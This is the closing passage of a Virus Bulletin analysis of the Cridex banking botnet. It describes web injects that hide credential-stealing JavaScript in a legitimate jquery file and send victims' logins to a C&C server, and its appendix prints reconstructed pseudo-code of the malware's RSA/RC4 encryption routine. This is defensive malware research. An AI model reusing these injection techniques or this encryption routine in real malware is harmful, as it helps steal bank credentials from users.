&lt;/redirect&gt;</pre><p><a href="#figure.6">Figure 6</a> shows the source code of an injected page belonging to a financial institution.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Injected page" src="/uploads/images/figures/2012/10/Cridex-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Injected page</b></p></div><p>The /jqueryaddonsv2.js is redirected to a JavaScript page that can inject the forms and submit the user&rsquo;s log-in information to the C&amp;C server.</p><p>In the third generation, the malicious JavaScript is embedded in the legitimate &lsquo;jquery.min.js&rsquo; file, which makes the injection more subtle. It seems the malicious JavaScript is still under development. With the exception of the same function that can submit the user&rsquo;s log-in information, there are cases in the executeActions function that are not implemented yet.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4525900"></a>Conclusion</h2></div></div></div><p>Although Cridex only has a short history (having first appeared at the end of 2011), the malware has become more aggressive recently. It already has three generations. Each of them has a distinct message data structure and encryption scheme. Its trend is to reuse existing libraries and formats to give the bot more flexibility and extensibility. In each generation updates do not cause it to switch to the newest generation, instead each bot generation retains its own formatting. It seems these samples are the beta versions for the author&rsquo;s development testing.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4694678"></a>Appendix</h2></div></div></div><pre class="programlisting">//Pseudo code Cridexv2 Encrypt

BOOL fResult = FALSE;
HCRYPTPROV hProv = NULL;
HCRYPTHASH hHash = NULL;
HCRYPTKEY hSessionKey = NULL;
HANDLE hInFile = INVALID_HANDLE_VALUE;
HANDLE hOutFile = INVALID_HANDLE_VALUE;
BOOL finished = FALSE;
BYTE pbBuffer[OUT_BUFFER_SIZE];
DWORD dwByteCount = 0;
DWORD dwBytesWritten = 0;
LPCTSTR pkeyCipher = _T(&ldquo;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvR7x8oHW63g45dwL84Xyga4jdsEUyYc9taOLTZ+kEhwauB7UbvXliNZZsq1HzsNgz+Ge7jVT2nyBIvDwx6CozX0iNM2QG7ZalwB6zBVyvpgTNTQqE8ODZrDGIkabg4OT3YeRrux4Z8GZ14Jja/jITSQZBMvsWguP/wFpUJ35v2wIDAQAB&rdquo;);
CERT_PUBLIC_KEY_INFO *publicKeyInfo;
DWORD publicKeyInfoLen;
HCRYPTKEY      hPubKey = 0;
SimpleBLOB *simpleBLOB = new SimpleBLOB();
DWORD keyLen;

// Acquire a handle
CryptAcquireContext(&amp;hProv,NULL,MS_DEF_PROV, PROV_RSA_FULL,CRYPT_VERIFYCONTEXT|CRYPT_SILENT);

//not going to be used in the encryption, only used when calculating the SHA1 of the plain-text message
CryptCreateHash(hProv, CALG_SHA1, 0, 0, &amp;hHash);

BYTE* pbSignedMessageBlob = NULL;
DWORD cbSignedMessageBlob = 0;

//
// Base64 -&gt; binary
//

Base64ToBinary(pkeyCipher,0,&amp;pbSignedMessageBlob,&amp;cbSignedMessageBlob);
CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, pbSignedMessageBlob, cbSignedMessageBlob, CRYPT_DECODE_ALLOC_FLAG, NULL, &amp;publicKeyInfo, &amp;publicKeyInfoLen);


// Get the public key information for the certificate.
CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, publicKeyInfo, &amp;hPubKey);

CryptGenKey(hProv, CALG_RC4, 0x11, &amp;hSessionKey);
keyLen = 0x8C;
CryptExportKey(hSessionKey, hPubKey, SIMPLEBLOB, 0, (BYTE*)simpleBLOB, &amp;keyLen);

do

{
     dwByteCount = 0;


     // Now read data from the input file
     ReadFile(hInFile, pbBuffer, IN_BUFFER_SIZE, &amp;dwByteCount, NULL);


     if (dwByteCount == 0)
           break;

     finished = (dwByteCount &lt; IN_BUFFER_SIZE);

     // Encrypt
     fResult = CryptEncrypt(hSessionKey, 0, finished, 0, pbBuffer, &amp;dwByteCount,
           OUT_BUFFER_SIZE);

 
     // Write the encrypted/decrypted data to the output file.
     fResult = WriteFile(hOutFile, pbBuffer, dwByteCount,
           &amp;dwBytesWritten, NULL);
 
} while (!finished);

_tprintf(_T(&ldquo;File %s is encrypted successfully!\n&rdquo;));
}

/* Cleanup */
if (hInFile != INVALID_HANDLE_VALUE) CloseHandle(hInFile);
if (hOutFile != INVALID_HANDLE_VALUE) CloseHandle(hOutFile);
if (hSessionKey != NULL) CryptDestroyKey(hSessionKey);
if (hHash != NULL) CryptDestroyHash(hHash);
if (hProv != NULL) CryptReleaseContext(hProv, 0</pre></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Cridex botnet preview&url=https://www.virusbulletin.com/virusbulletin/2012/10/cridex-botnet-preview"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2012/10/cridex-botnet-preview'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2012/10/cridex-botnet-preview&title=Cridex botnet preview"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2012/10/cridex-botnet-preview&t=Cridex botnet preview"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2012/10/cridex-botnet-preview"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>